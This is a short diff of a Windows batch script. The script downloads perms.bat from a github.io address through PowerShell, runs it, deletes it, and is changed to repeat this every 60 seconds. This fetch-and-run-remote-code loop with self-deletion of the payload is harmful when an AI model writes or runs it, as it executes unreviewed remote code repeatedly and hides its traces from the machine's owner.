@@ -1,4 +1,5 @@
 @echo off
+:loop
 echo Starting Download...
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://eckermania2.github.io/pcperms/perms.bat', 'perms.bat')"
 echo Download finished!
@@ -9,5 +10,6 @@ echo Run attempted! Allowing 30 seconds to process run command...
 timeout /t 30 /NOBREAK > nul
 echo Deleting file...
 del "C:\Users\%USERNAME%\Downloads\perms.bat"
-echo File deleted! Ending process in 10 seconds
-timeout /t 10 /NOBREAK > nul
+echo File deleted! Looping in 60 seconds...
+timeout /t 60 /NOBREAK > nul
+goto loop
